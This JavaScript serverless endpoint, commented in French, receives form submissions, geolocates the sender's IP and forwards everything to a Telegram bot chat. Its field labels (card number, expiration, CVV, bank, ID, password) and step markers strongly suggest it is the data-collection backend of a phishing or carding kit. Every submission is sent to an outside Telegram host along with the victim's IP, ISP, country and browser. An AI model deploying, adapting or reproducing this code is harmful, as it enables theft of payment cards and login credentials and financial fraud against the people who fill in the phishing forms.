// api/notify.js

const TOKEN        = process.env.TELEGRAM_TOKEN;
const CHAT         = process.env.CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: {
    bodyParser: false,  // on gère la lecture du body nous-mêmes
  },
};

// lit le body qu’il soit JSON ou texte brut
async function readBody(req) {
  const contentType = req.headers['content-type'] || '';
  const chunks = [];
  for await (const chunk of req) {
    chunks.push(chunk);
  }
  const raw = Buffer.concat(chunks).toString();
  if (contentType.includes('application/json')) {
    try {
      const obj = JSON.parse(raw);
      return obj.message || '';
    } catch {
      // si JSON invalide, on retombe sur le texte brut
    }
  }
  return raw;
}

// tente 3 services pour récupérer isp + pays
async function geoLookup(ip) {
  let isp = 'inconnue';
  let country = 'inconnue';
  let countryCode = '';

  // 1️⃣ ipinfo.io
  try {
    const res = await fetch(
      `https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`
    );
    if (res.ok) {
      const d = await res.json();
      if (d.org) isp = d.org.replace(/^AS\d+\s+/i, '');
      if (d.country) {
        countryCode = d.country;
        country = d.country;
      }
      return { isp, countryCode, country };
    }
  } catch {}

  // 2️⃣ ipwho.is
  try {
    const res = await fetch(`https://ipwho.is/${ip}`);
    const d = await res.json();
    if (d.success) {
      isp = d.org || isp;
      country = d.country || country;
      return { isp, countryCode: d.country_code, country };
    }
  } catch {}

  // 3️⃣ ip-api.com
  try {
    const res = await fetch(
      `https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`
    );
    const d = await res.json();
    if (d.status === 'success') {
      isp = d.isp.replace(/^AS\d+\s+/i, '') || isp;
      country = d.country || country;
      countryCode = d.countryCode;
      return { isp, countryCode, country };
    }
  } catch {}

  return { isp, countryCode, country };
}

// pour afficher le nom complet du pays en français
function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length === 2) {
    try {
      const dn = new Intl.DisplayNames(['fr'], { type: 'region' });
      return dn.of(codeOrName);
    } catch {}
  }
  return codeOrName;
}

export default async function handler(req, res) {
  // 0️⃣ CORS pour Safari (pré‐flight)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // 1️⃣ Seul POST est autorisé pour l’envoi
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST, OPTIONS');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // 2️⃣ Lecture du message envoyé (JSON ou plain text)
  const rawMsg = (await readBody(req)).trim();
  if (!rawMsg) {
    return res.status(400).json({ error: 'Missing message' });
  }

  // 3️⃣ Récupération de l’IP et du User-Agent
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // 4️⃣ Lookup Geo (ISP, pays)
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country || countryCode);

  // 5️⃣ Date & heure (FR, année sur 2 chiffres)
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR', {
    day:   '2-digit',
    month: '2-digit',
    year:  '2-digit'
  });
  const time = now.toLocaleTimeString('fr-FR', {
    hour:   '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // 6️⃣ Mapping des icônes selon le début de la ligne
  const iconMap = {
    'étape':               '📣',
    'nom':                 '👤',
    'prénom':              '🙋',
    'téléphone':           '📞',
    'email':               '✉️',
    'adresse':             '🏠',
    'carte':               '💳',
    'numéro':              '🔢',
    'exp':                 '📅',
    'expiration':          '📅',
    'cvv':                 '🔒',
    'banque':              '🏦',
    'id':                  '🆔',
    'pass':                '🔑',
    'password':            '🔑'
  };

  // 7️⃣ Construction du texte Telegram
  const lines = rawMsg.split('\n').map(l => l.trim()).filter(l => l);
  let text = '';
  for (let line of lines) {
    const low = line.toLowerCase();
    let icon = '';
    for (let key in iconMap) {
      if (low.startsWith(key)) {
        icon = iconMap[key];
        break;
      }
    }
    text += icon ? `${icon} ${line}\n` : `${line}\n`;
  }

  // 8️⃣ Ajout du bloc infos système
  text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
  text += `🌐 IP Client     : ${ip}\n`;
  text += `🔎 ISP Client    : ${isp}\n`;
  text += `🌍 Pays Client   : ${countryDisplay}\n`;
  text += `📍 User-Agent    : ${ua}\n`;
  text += `©️ ${now.getFullYear()} ©️`;

  // 9️⃣ Envoi sur Telegram
  const tg = await fetch(
    `https://api.telegram.org/bot${TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT,
        text,
        disable_web_page_preview: true
      }),
    }
  );
  const raw = await tg.text();

  // 🔟 On retourne le statut de l’envoi
  return res
    .status(tg.ok ? 200 : tg.status)
    .json({ ok: tg.ok, full: raw });
}